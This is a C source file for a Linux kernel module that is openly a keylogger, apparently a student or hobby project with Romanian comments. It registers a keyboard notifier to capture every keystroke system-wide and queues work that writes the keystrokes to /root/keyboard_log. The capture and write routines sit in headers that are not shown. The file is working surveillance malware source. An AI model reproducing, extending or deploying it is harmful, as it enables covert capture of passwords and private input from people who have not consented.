#include "struct_keylogger.h"
#include "keyboard_callback.h"
#include "write_to_file.h"
#define LOG_FILE_PATH "/root/keyboard_log"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Raluca+Bogdan");
MODULE_DESCRIPTION("Un simplu modul pentru logarea tastelor");

static struct KEYLOGGER *keylogger;

static int __init keyboard_logger_init(void) 
{
    keylogger=kzalloc(sizeof(KEYLOGGER),GFP_KERNEL);//kzalloc seteaza cu 0 peste tot
    if(keylogger==NULL)
    {
        pr_err("Nu se poate aloca memorie\n");
        return -ENOMEM;
    }

    keylogger->key_notifier.notifier_call=keyboard_callback;
    
    INIT_WORK(&keylogger->work_struct,&write_to_file);//leaga workqueue cu functia(handler)

    if(IS_ERR(keylogger->filename = filp_open(LOG_FILE_PATH, O_CREAT | O_RDWR, 0644)))
    {
        pr_info("Unable to create a log file\n");
    	return -EINVAL;
	}
    register_keyboard_notifier(&keylogger->key_notifier);
    

    return 0;
}

static void __exit keyboard_logger_exit(void) 
{
    unregister_keyboard_notifier(&keylogger->key_notifier);
    kfree(keylogger);
}

module_init(keyboard_logger_init);
module_exit(keyboard_logger_exit);